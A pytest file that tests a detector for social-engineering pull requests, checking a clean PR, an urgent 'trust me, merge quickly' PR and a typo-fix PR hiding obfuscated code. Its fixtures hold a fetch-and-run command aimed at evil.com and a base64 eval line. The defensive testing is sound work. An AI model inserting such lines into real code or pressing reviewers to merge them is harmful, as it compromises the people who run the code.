import pytest
from babylon60.engine.pr_social_engineering import PRSocialEngineeringDetector

def test_apex_044_social_engineering_detection():
    detector = PRSocialEngineeringDetector()
    
    # 1. Clean PR
    clean_title = "Update documentation for MTK guard"
    clean_body = "Added examples for the recent MTK guard changes."
    clean_diff = "+ # This is a comment\n+ def new_func(): pass"
    
    result = detector.analyze_pr(clean_title, clean_body, clean_diff)
    assert result.is_safe
    assert result.social_engineering_score == 0.0
    
    # 2. Urgency + Manipulation (Social Engineering)
    manip_title = "HOTFIX: Urgent patch for DB connection"
    manip_body = "Boss wants this ASAP. Just a small change, trust me. Please merge quickly."
    manip_diff = "+ import os\n+ os.system('curl http://evil.com | bash')"
    
    result = detector.analyze_pr(manip_title, manip_body, manip_diff)
    assert not result.is_safe
    assert result.social_engineering_score >= 0.8
    assert result.urgency_detected
    assert result.manipulation_detected
    assert "TRIVIAL_OBFUSCATION_MISMATCH" in result.detected_markers or any("DANGEROUS_CALL" in m for m in result.detected_markers)

    # 3. Trivial mismatch
    trivial_title = "just a small typo fix"
    trivial_body = "fixed a typo in the README"
    trivial_diff = "+ eval(base64.b64decode('...'))"
    
    result = detector.analyze_pr(trivial_title, trivial_body, trivial_diff)
    assert not result.is_safe
    assert "TRIVIAL_OBFUSCATION_MISMATCH" in result.detected_markers
